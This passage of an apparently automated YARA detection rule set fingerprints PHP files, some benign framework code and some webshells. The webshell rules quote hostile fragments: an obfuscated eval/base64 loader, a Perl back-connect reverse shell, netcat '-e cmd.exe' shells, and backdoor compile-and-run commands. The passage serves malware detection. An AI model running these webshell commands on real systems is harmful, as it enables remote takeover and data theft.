      $s1 = "<form method=\"POST\" action=\"<?php echo \"PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin\"?>\" name=\"kaypos\">" fullword ascii
      $s2 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yeniklasor=1&dizin=$dizin\"?>\" " fullword ascii
      $s3 = "<img border=\"0\" src=\"http://www.aventgrup.net/avlog.gif\"></td>" fullword ascii
      $s4 = "<form method=\"POST\" action=\"<?php echo \"$fistik.php?yenidosya=1&dizin=$dizin\"?>\" " fullword ascii
      $s5 = "<a href=\"<?php echo \"$fistik\";?>.php?sildos=<?php echo $ekinci;?>&dizin=<?php echo $dizin;?>\" style=\"text-decoration: no" fullword ascii
      $s6 = "<a href=\"<?php echo \"$fistik.php?dizin=$dizin/\" ?><?php echo \"$ekinci\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s7 = "<a href=\"<?php echo \"$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin\"?>\" style=\"text-decoration: none\">" fullword ascii
      $s8 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif\"></td>" fullword ascii
      $s9 = "<img border=\"0\" src=\"http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif\"></td>" fullword ascii
      $s10 = "00000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s11 = "<a href=\"<?php echo \"$fistik.php?yenklas=1&dizin=$dizin\";?>\" style=\"text-decoration: none\">" fullword ascii
      $s12 = "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100" fullword ascii
      $s13 = "<td rowspan=\"2\" height=\"19\"><font face=\"Verdana\" style=\"font-size: 8pt\">&nbsp;<?php echo \"$dizin/$duzenle\"?></font><" fullword ascii
      $s14 = "000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left\"" fullword ascii
      $s15 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #0" fullword ascii
      $s16 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000" fullword ascii
      $s17 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT" fullword ascii
      $s18 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s19 = "<a href=\"http://www.aventgrup.net\" style=\"text-decoration: none\">" fullword ascii
      $s20 = "<a color=\"#9F9F9F\" target=\"_blank\" href=\"<?php echo \"$fistik.php?sistembilgisi=1\";?>\" style=\"text-decoration: none\"><f" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule RequestToken
{
   meta:
      description = "php22 - file RequestToken.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a1e94691968e4c354fbe8f6928abd61cfd40afed5171a064210f1b558ed63b42"
   strings:
      $x1 = "* This exception is thrown when an error occured during the request_token process." fullword ascii
      $x2 = "* @license http://code.google.com/p/dropbox-php/wiki/License MIT" fullword ascii
      $s3 = "* @author Evert Pot (http://www.rooftopsolutions.nl/) " fullword ascii
      $s4 = "* @copyright Copyright (C) 2010 Rooftop Solutions. All rights reserved." fullword ascii
      $s5 = "* Dropbox RequestToken exception" fullword ascii
      $s6 = "* @package Dropbox " fullword ascii
      $s7 = "class Dropbox_Exception_RequestToken extends Dropbox_Exception {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule php22_PayPal
{
   meta:
      description = "php22 - file PayPal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "be90924daa857679d597b0a858ba4e925941b5397a674cec13819bb7c3ee100a"
   strings:
      $x1 = "* @link https://www.x.com/blogs/matt/2010/10/26/error-codes-explained-15005" fullword ascii
      $x2 = "* This returns a formatted error given a payment processor error response code." fullword ascii
      $x3 = "$processor_prefix = $this->GetArrayVal($httpParsedResponseAr,\"L_ERRORPARAMID0\");" fullword ascii
      $x4 = "$processor_code = $this->GetArrayVal($httpParsedResponseAr,\"L_ERRORPARAMVALUE0\");" fullword ascii
      $s5 = "$processor_message =  $processor_prefix . $this->getProcessorResponseDescription($processor_code);" fullword ascii
      $s6 = "* Given a response array, attempt to return the most sensible error message." fullword ascii
      $s7 = "$nvpreq = \"METHOD=$methodName_&VERSION=$version&PWD=$API_Password&USER=$API_UserName&SIGNATURE=$API_Signature$nvpStr_\";" fullword ascii
      $s8 = "* @param PaymentRequest $req Request object to be processed" fullword ascii
      $s9 = "* PayPal extends the generic PaymentProcessor object to process" fullword ascii
      $s10 = "private function getProcessorResponseDescription($code)" fullword ascii
      $s11 = "* Send HTTP POST Request.  Throws an Exception if the server communication failed" fullword ascii
      $s12 = "// for error descriptions, refrer to https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_nvp" ascii
      $s13 = "// for error descriptions, refrer to https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_nvp" ascii
      $s14 = "* @see PaymentProcessor::Refund()" fullword ascii
      $s15 = "// Execute the API operation" fullword ascii
      $s16 = "* Process a PaymentRequest" fullword ascii
      $s17 = ": $processor_prefix . ' - ';" fullword ascii
      $s18 = "$API_Endpoint = \"https://api-3t.\" . $this->environment . \".paypal.com/nvp\";" fullword ascii
      $s19 = "[L_LONGMESSAGE0] => This%20transaction%20cannot%20be%20processed%2e%20Please%20contact%20PayPal%20Customer%20Service%2e" fullword ascii
      $s20 = "$resp->ResponseMessage = urldecode( \"Charge of \" . $this->GetArrayVal($resp->RawResponse,\"AMT\") . \" Posted\" );" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule ProductVariantCombinationValidatorSpec
{
   meta:
      description = "php22 - file ProductVariantCombinationValidatorSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e6fd0c9debf9d7917971d683a6916774c11dd3025cc632ca27b62df6f3050623"
   strings:
      $s1 = "function let(ExecutionContextInterface $context, ProductVariantsParityCheckerInterface $variantsParityChecker): void" fullword ascii
      $s2 = "use Symfony\\Component\\Validator\\Context\\ExecutionContextInterface;" fullword ascii
      $s3 = "ExecutionContextInterface $context," fullword ascii
      $s4 = "use Sylius\\Bundle\\ProductBundle\\Validator\\Constraint\\ProductVariantCombination;" fullword ascii
      $s5 = "function it_adds_violation_if_variant_with_given_same_options_already_exists(" fullword ascii
      $s6 = "use Sylius\\Component\\Product\\Checker\\ProductVariantsParityCheckerInterface;" fullword ascii
      $s7 = "$context->addViolation('Variant with given options already exists', Argument::any())->shouldBeCalled();" fullword ascii
      $s8 = "$variant->getProduct()->willReturn($product);" fullword ascii
      $s9 = "use Sylius\\Component\\Product\\Model\\ProductVariantInterface;" fullword ascii
      $s10 = "use Sylius\\Component\\Product\\Model\\ProductInterface;" fullword ascii
      $s11 = "'message' => 'Variant with given options already exists'," fullword ascii
      $s12 = "$variantsParityChecker->checkParity($variant, $product)->willReturn(true);" fullword ascii
      $s13 = "$variantsParityChecker->checkParity($variant, $product)->willReturn(false);" fullword ascii
      $s14 = "use Symfony\\Component\\Validator\\ConstraintValidator;" fullword ascii
      $s15 = "function it_does_not_add_violation_if_product_does_not_have_variants(" fullword ascii
      $s16 = "function it_does_not_add_violation_if_product_does_not_have_options(" fullword ascii
      $s17 = "final class ProductVariantCombinationValidatorSpec extends ObjectBehavior" fullword ascii
      $s18 = "$constraint = new ProductVariantCombination([" fullword ascii
      $s19 = "namespace spec\\Sylius\\Bundle\\ProductBundle\\Validator;" fullword ascii
      $s20 = "ProductVariantsParityCheckerInterface $variantsParityChecker" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule php22_preset
{
   meta:
      description = "php22 - file preset.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e35eeeccaf99cc1af488a2e58b71eecfb334125f166f0b9d8bdc56dc784119dd"
   strings:
      $x1 = "* @author    RocketTheme http://www.rockettheme.com" fullword ascii
      $s2 = "$lang->load('com_gantry5.sys') || $lang->load('com_gantry5.sys', JPATH_ADMINISTRATOR . '/components/com_gantry5');" fullword ascii
      $s3 = "* @copyright Copyright (C) 2007 - 2017 RocketTheme, LLC" fullword ascii
      $s4 = "* http://www.gnu.org/licenses/gpl-2.0.html" fullword ascii
      $s5 = "$this->updateCookie($cookie, false, time() - 42000);" fullword ascii
      $s6 = "$this->loadLanguage('plg_quickicon_gantry5.sys');" fullword ascii
      $s7 = "$preset = $input->cookie->getString($cookie);" fullword ascii
      $s8 = "if ($input->getCmd($resetVar) !== null) {" fullword ascii
      $s9 = "$preset = $input->getCmd($presetVar);" fullword ascii
      $s10 = "$domain = $app->get('cookie_domain');" fullword ascii
      $s11 = "$resetVar = $this->params->get('reset', 'reset-settings');" fullword ascii
      $s12 = "$presetVar = $this->params->get('preset', 'presets');" fullword ascii
      $s13 = "$input->cookie->set($name, $value, $expire, $path, $domain);" fullword ascii
      $s14 = "protected function updateCookie($name, $value, $expire = 0)" fullword ascii
      $s15 = "if (!class_exists('Gantry5\\Loader')) return;" fullword ascii
      $s16 = "$this->updateCookie($cookie, $preset, 0);" fullword ascii
      $s17 = "$path   = $app->get('cookie_path', '/');" fullword ascii
      $s18 = "// Do not load if Gantry libraries are not installed or initialised." fullword ascii
      $s19 = "* @license   GNU/GPLv2 and later" fullword ascii
      $s20 = "$cookie = md5($theme->name);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule php22_ogcsma
{
   meta:
      description = "php22 - file ogcsma.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8ff1a79c5580c005d20d403cf774124ea9cf189d0ae730de7f713939ca68661e"
   strings:
      $s1 = "$fay48 = \"7X39W9u40ujP7PPs/6BtOXi4hSQE6AeU7AIl0GHLdFgLep88aXc7BOrEQeLi7Pb+7WpzJNllbztkyJ7znvcuuwXb0oxT0nVzpBlWi10zNC22w7RfKpVer" ascii
      $s2 = "Ub3h6T8myFrXX0X/LznylM0779VVKZhjH6mvyspyBV+7aVghO9/TqGCEO7LI//tyzuS0ukclJoXrOCuAiO53UZtC+Q8m7kdWVun4OjXRgaseENzyiGBMviqwwk4inJ6l" ascii
      $s3 = "$auth_pass = \"39a54ee9b50e3484df126d83277593dc\";" fullword ascii
      $s4 = "dvIPMxti0pKKieFrG7GuOxqm9Hb3fqoQ4cDrhpkAknEtPgxsNcFbjUEyE43GucqwInEkbhWSu7fiIxDY5ig8qEjJKTsG9BbX24z95Q23qNm/tkq6fEUyrgVU0mOCbmg3" ascii
      $s5 = "BxqCU8vyD6Ooy+DpWvqOxSkBnogNFErFEXy4zpUDlLTEdPiwXXP8lxe2wqrDjntrxrSl4clnbEqRUcergnbLt+pgCQvMGFCwV+res7NRjrsmna8pToZYdbDpzCMFmLOX" ascii
      $s6 = "xmmvKRxrlr5tTxdDLsG7RdTbzw0uUppNAOetCujh0BwqDDdGA08cQpEC8ddQXoCOVaPuNNr2sGiQ5IKXTJsSlLBpgaGftpT4fia71k+2FPtiQU3ajEVyTS0Kdsmx8Lne" ascii
      $s7 = "NjToT92oXHegazIBleTdLY6tjVyPGerJJ2lQKvPB5PNrbiaQkwfxBZZz0INJoSqfP/AA==\";" fullword ascii
      $s8 = "Dc+NbAtYNDqZeCPXPwqdHCiNJ479y+m4VljGfB+okdIsmSMlTCUHeVLL46RTwFCkKmYH4ErC/TTXlOCmD4/Q09G5f1kP7lCCeztRSmsSWlqBa7bjbtoIB3sRoJ5aKg4o" ascii
      $s9 = "0QUFJqHWqAjttUunHtH5E1rx7MopOVUKZ+U6Ax7r/ntcHRJ0OoUEAb268/b8PXZzGUW8b0SrR5i51yvMCTO98XaMnbJSyPGeEn4kXsYdLtHpdptmptZ32+e9g42Ns7pD" ascii
      $s10 = "wH+SoOW1fmudVSB/+ezunhFHditMhnt7tJ0GcUYj0d5yPEjDjEI2xNQQxOcqmKaMKxN5NBvZn20JuCdN7MZ+Ra/oRuNI5/prMfczr6buaTH3M6+OFO5z6kYafC1Yco3H" ascii
      $s11 = "H5ObU9xtvhAVAlpebxbvrRCFWppVWbzo2X/CDdaaPWQhI8AhPZpQGNaRCJW7kAU+tuJKGXcFTXGR7hs8KEYW+4eBZmqCbPT4q+JvXPrl2jhU7TZtTYdQhcmXz+MpPeLn" ascii
      $s12 = "eval(str_rot13(gzinflate(str_rot13(base64_decode(($fay48))))));" fullword ascii
      $s13 = "VNeRANtDfDDzD+JTGi2T5d7l7sfW6rNTY6MInYMfFAa6V1sFueO2Cu5ybGeGXcw8D3PEW7jNEysk8Oj5d0vKYYPBxS2lg4mnzbeCpgdWndkC8aHash27bAloOnOg2eyX" ascii
      $s14 = "kg1G42GGs7lXr88+JWBX7o8fHjcrzFZ9GlPRMjN7xvhuV6Pigf+cOmZoeLhS432Xa3KFsKbt4CUPbev4NsE6iaclx5EsuKkBMyZdmtbuKWqK/4xNcF463gdo0lZZTLqG" ascii
      $s15 = "ycqq63xBGJOVdnWRfkZbsi4BFBkiIBNbXkCQikZ88U7iMFqLJ9WbQrVOKljz2U3JGMkeNvR4xmIY5pqHZG4LLYTagt/5khrcdyaKolGgt3KPU/Kat//unB0jpUR3AsDu" ascii
      $s16 = "xl9cHOLg9AVOGCpBRx3LhQMdZ6kJmHDY22HfsTl3QEGpcNLL+3o/8GKTsaX6cGeDMACVzZhgkbe7EjEODb48fCYyZ1XsSnxYBxOooqyP9V5kpmAp95CwFQ//hUvVMEvS" ascii
      $s17 = "45LHhyUVK1EAg5KBIbAcJrthxJh0KB0deY6Bkt0TOaoIT3LBHIewmR69A8To8tBbbtOzIGjpfxBQUhcD//tCjiLlL4G6edAoKiqFJJrkR/ywBkG+nSeFUYRYYyHZCUcU" ascii
      $s18 = "p971wet/tK3ns3PDte82Iq/stB/btoYb15f3V+vdjwj2LLA/Pr2dptaGt9/8EKNlv1vfBvYz51Hr28DMzvemq4arZ4h997VK9CvzavjD3XPa1//OAY7smp/fbN9+MwHP" ascii
      $s19 = "5kuWTj+qb76o9Xt0b3BsOjg/Vixx9iab+/bPIqMM2K8/pb/9w0PmleP/5r/+61s35xOJVG/13vg/28//joqG+dv3v/vvy+Xb7+/v5W+fDx/p5qbh7sfjwdXEqrt8O9fd" ascii
      $s20 = "iV0HBwE/Ct/DM+08bn4aA17Nglr6MpDcjag4hooQ3xSwXezYPkuT6SGeSohIGO40JsSj58qvAzNVf6R3CUjfwkFTllGytudRX8SSzaRKgUcxt07RFR2+l1OAGCcwUlFB" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      8 of them
}

rule removeacl_class
{
   meta:
      description = "php22 - file removeacl.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aa4763d2645f5ff1960e27b1e9d3dc6f763f2b6b3045819d8575b624dc95cc71"
   strings:
      $s1 = "* @subpackage processors.security.access" fullword ascii
      $s2 = "return 'modSecurityAccessRemoveAclProcessor';" fullword ascii
      $s3 = "class modSecurityAccessRemoveAclProcessor extends modObjectRemoveProcessor {" fullword ascii
      $s4 = "* Reload current user's ACLs" fullword ascii
      $s5 = "$this->modx->user->getAttributes(array(), '', true);" fullword ascii
      $s6 = "* @param string $type The class_key for the ACL." fullword ascii
      $s7 = "* @param string $id The ID of the ACL." fullword ascii
      $s8 = "if ($this->modx->getUser()) {" fullword ascii
      $s9 = "$this->object = $this->modx->getObject($this->classKey, $id);" fullword ascii
      $s10 = "* Remove an ACL." fullword ascii
      $s11 = "public $languageTopics = array('access');" fullword ascii
      $s12 = "* @return bool|void" fullword ascii
      $s13 = "$this->classKey = $this->getProperty('type');" fullword ascii
      $s14 = "* @package modx" fullword ascii
      $s15 = "$id = $this->getProperty('id');" fullword ascii
      $s16 = "return $this->modx->lexicon($this->objectType.'_err_nf');" fullword ascii
      $s17 = "return $this->modx->lexicon($this->objectType.'_type_err_ns');" fullword ascii
      $s18 = "public $permission = 'access_permissions';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_qiang7
{
   meta:
      description = "php22 - file qiang7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7d420ff28f14669f1011d287ab8ee311679c173f24b77258043d994210c99fb1"
   strings:
      $s1 = "$filename=$_GET['xbid'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ObjectMetadata
{
   meta:
      description = "php22 - file ObjectMetadata.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a5b2c1d34cbf88a6cc48c964ce4d517c23f6b4c20eeb86f4e091f4a30f819c5a"
   strings:
      $s1 = "* @method \\Pimcore\\Model\\DataObject\\Data\\ObjectMetadata\\Dao getDao()" fullword ascii
      $s2 = "return $this->getDao()->load($source, $destination, $fieldname, $ownertype, $ownername, $position);" fullword ascii
      $s3 = "$key = strtolower(substr($name, 3, strlen($name) - 3));" fullword ascii
      $s4 = "$this->getDao()->save($object, $ownertype, $ownername, $position);" fullword ascii
      $s5 = "public function load(DataObject\\Concrete $source, $destination, $fieldname, $ownertype, $ownername, $position)" fullword ascii
      $s6 = "* @param DataObject\\Concrete $source" fullword ascii
      $s7 = "* @return DataObject\\Concrete" fullword ascii
      $s8 = "* @var DataObject\\Concrete" fullword ascii
      $s9 = "* @param string $ownertype" fullword ascii
      $s10 = "* @internal param $object" fullword ascii
      $s11 = "return $this->getObject()->__toString();" fullword ascii
      $s12 = "* @param null $object" fullword ascii
      $s13 = "return isset($this->data[$key]) ? $this->data[$key] : null;" fullword ascii
      $s14 = "throw new \\Exception(\"Requested data $key not available\");" fullword ascii
      $s15 = "* @param $object" fullword ascii
      $s16 = "* @param $ownertype" fullword ascii
      $s17 = "* @param $fieldname" fullword ascii
      $s18 = "* @param $arguments" fullword ascii
      $s19 = "* @param $destination" fullword ascii
      $s20 = "* @param $element" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule ReservedWordsMethodNameChecker
{
   meta:
      description = "php22 - file ReservedWordsMethodNameChecker.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8ba031f66904f54ad3beb924c88ef68a9381663ab81fb77ba58a326ae6706182"
   strings:
      $s1 = "* (c) Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s2 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s3 = "* This file is part of PhpSpec, A php toolset to drive emergent" fullword ascii
      $s4 = "* design by specification." fullword ascii
      $s5 = "return !\\in_array(strtolower($name), $this->reservedWords);" fullword ascii
      $s6 = "private $reservedWords = [" fullword ascii
      $s7 = "public function isNameValid(string $name): bool" fullword ascii
      $s8 = "'__halt_compiler'," fullword ascii
      $s9 = "final class ReservedWordsMethodNameChecker implements NameChecker" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule parent_page
{
   meta:
      description = "php22 - file parent_page.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "241c7ed5e798c9fef9f19047c75ce658899f76b63554fb9697ec2f3b571d29a7"
   strings:
      $s1 = "if (is_object($pagetype) && $pagetype->getPageTypePublishTargetTypeID() == $configuration->getPageTypePublishTargetTypeID()) {" fullword ascii
      $s2 = "$configuredTarget = $pagetype->getPageTypePublishTargetObject();" fullword ascii
      $s3 = "$cID = $configuredTarget->getParentPageID();" fullword ascii
      $s4 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s5 = "$cParentID = $target->getCollectionID();" fullword ascii
      $s6 = "<span class=\"checkbox\"><?=t('This page will be published beneath <a href=\"%s\">%s</a>.', Loader::helper('navigation')->getLin" ascii
      $s7 = "<span class=\"checkbox\"><?=t('This page will be published beneath <a href=\"%s\">%s</a>.', Loader::helper('navigation')->getLin" ascii
      $s8 = "$form = Loader::helper('form');" fullword ascii
      $s9 = "ollection($pc), $pc->getCollectionName())?></label>" fullword ascii
      $s10 = "$pc = Page::getByID($cID, 'ACTIVE');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ProcOpenReRunner
{
   meta:
      description = "php22 - file ProcOpenReRunner.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ba607df6e61c10706271cc6cd67dae49b6590ab763fb4754034a6d772dea6fe4"
   strings:
      $x1 = "$command = $this->buildArgString() . escapeshellcmd($this->getExecutablePath()).' '.join(' ', array_map('escapeshellarg'" fullword ascii
      $x2 = "use Symfony\\Component\\Process\\PhpExecutableFinder;" fullword ascii
      $s3 = "public static function withExecutionContext(PhpExecutableFinder $phpExecutableFinder, ExecutionContext $executionContext)" fullword ascii
      $s4 = "use PhpSpec\\Process\\Context\\ExecutionContext;" fullword ascii
      $s5 = "* @param PhpExecutableFinder $phpExecutableFinder" fullword ascii
      $s6 = "* @param ExecutionContext $executionContext" fullword ascii
      $s7 = "* (c) Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s8 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s9 = "* @var ExecutionContext" fullword ascii
      $s10 = "&& $this->getExecutablePath()" fullword ascii
      $s11 = "foreach ($this->executionContext->asEnv() as $key => $value) {" fullword ascii
      $s12 = "$command = $this->buildArgString() . escapeshellcmd($this->getExecutablePath()).' '.join(' ', array_map('escapeshellarg', $args)" ascii
      $s13 = "$reRunner = new static($phpExecutableFinder);" fullword ascii
      $s14 = "$proc = proc_open( $command, $desc, $pipes );" fullword ascii
      $s15 = "final class ProcOpenReRunner extends PhpExecutableReRunner" fullword ascii
      $s16 = "namespace PhpSpec\\Process\\ReRunner;" fullword ascii
      $s17 = "* This file is part of PhpSpec, A php toolset to drive emergent" fullword ascii
      $s18 = "$reRunner->executionContext = $executionContext;" fullword ascii
      $s19 = "private $executionContext;" fullword ascii
      $s20 = "$argstring .= $key . '=' . escapeshellarg($value) . ' ';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule php22_PHPget
{
   meta:
      description = "php22 - file PHPget.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "96a5774db566016e5a3cb869995e36b1c76bda754789d7b816dad07c56f26a4a"
   strings:
      $x1 = "$res = execute(which('perl').\" /tmp/.bc $yourip $yourport &\");" fullword ascii
      $s2 = "function execute($cfe) {" fullword ascii
      $s3 = "$path = execute(\"which $pr\");" fullword ascii
      $s4 = "} elseif(function_exists('shell_exec')) {" fullword ascii
      $s5 = "$back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\"." fullword ascii
      $s6 = "if(function_exists('exec')) {" fullword ascii
      $s7 = "} elseif(function_exists('system')) {" fullword ascii
      $s8 = "} elseif(function_exists('passthru')) {" fullword ascii
      $s9 = "cf('/tmp/.bc',$back_connect);" fullword ascii
      $s10 = "$res .= @fread($f,1024);" fullword ascii
      $s11 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii
      $s12 = "$yourport = 'your port';" fullword ascii
      $s13 = "@fputs($fp,@base64_decode($text));" fullword ascii
      $s14 = "$usedb = array('perl'=>'perl','c'=>'c');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule PriceRangeFilter
{
   meta:
      description = "php22 - file PriceRangeFilter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "03aa7f3ca3a7e359b3fc925c35af9e49aef00e2de79afa94ca497532f13c59ae"
   strings:
      $s1 = "if ($this->isItemVariantInPriceRange($item->getVariant(), $configuration)) {" fullword ascii
      $s2 = "Assert::keyExists($configuration, 'channel');" fullword ascii
      $s3 = "private function isItemVariantInPriceRange(ProductVariantInterface $variant, array $configuration): bool" fullword ascii
      $s4 = "* @param ProductVariantInterface $variant" fullword ascii
      $s5 = "* @param ProductVariantPriceCalculatorInterface $productVariantPriceCalculator" fullword ascii
      $s6 = "$price = $this->productVariantPriceCalculator->calculate($variant, ['channel' => $configuration['channel']]);" fullword ascii
      $s7 = "public function filter(array $items, array $configuration): array" fullword ascii
      $s8 = "return isset($configuration['filters']['price_range_filter']['min']);" fullword ascii
      $s9 = "$priceRange = $configuration['filters']['price_range_filter'];" fullword ascii
      $s10 = "use Sylius\\Component\\Core\\Model\\ProductVariantInterface;" fullword ascii
      $s11 = "private function isConfigured(array $configuration): bool" fullword ascii
      $s12 = "namespace Sylius\\Component\\Core\\Promotion\\Filter;" fullword ascii
      $s13 = "use Sylius\\Component\\Core\\Calculator\\ProductVariantPriceCalculatorInterface;" fullword ascii
      $s14 = "* @var ProductVariantPriceCalculatorInterface" fullword ascii
      $s15 = "return $priceRange['min'] <= $price && $priceRange['max'] >= $price;" fullword ascii
      $s16 = "public function __construct(ProductVariantPriceCalculatorInterface $productVariantPriceCalculator)" fullword ascii
      $s17 = "if (!$this->isConfigured($configuration)) {" fullword ascii
      $s18 = "if (isset($priceRange['min'], $priceRange['max'])) {" fullword ascii
      $s19 = "return $priceRange['min'] <= $price;" fullword ascii
      $s20 = "$this->productVariantPriceCalculator = $productVariantPriceCalculator;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}


rule PHPJackalkv1_5
{
   meta:
      description = "php22 - file PHPJackalkv1.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "121877e751bb92c4042c226da4f1ffa428c5eebf9d43e3dce517b962890a3607"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x3 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x4 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x5 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x7 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href=\\\"http://netjackal.by.ru\\\" target=\\\"_blank\\\">NetJackal</a>$et\";" fullword ascii
      $x8 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x9 = "if(!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x10 = "filE=/var/cpanel/accounting.log&workingdiR=$cwd\").\"\\\">Readable</a>\"; else echo \"Not readable\";}else echo \"Not found\";" fullword ascii
      $x11 = "if (!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x12 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x13 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x14 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x15 = "if (empty($CPU))$CPU = shelL(\"echo %PROCESSOR_IDENTIFIER%\");" fullword ascii
      $x16 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x17 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x18 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x19 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x20 = "echo \"<font color=blue>Port scanning started against \".htmlspecialchars($target).\":<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule QueryPath
{
   meta:
      description = "php22 - file QueryPath.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f32cbd15de62963afbee35cfcf516e8d78d1918dc366d8969158bdabb5ed7f8b"
   strings:
      $x1 = "* So @code$qp->dataURL('src', file_get_contents('my.png'), 'image/png')@endcode will inject " fullword ascii
      $x2 = "*  - A URL: If this is given, then the subsystem will read the content from that URL. THIS " fullword ascii
      $x3 = "* This code comes from Rhizome ({@link http://code.google.com/p/sinciput})" fullword ascii
      $x4 = "*  If a selector is passed in, an additional {@link find()} will be executed" fullword ascii
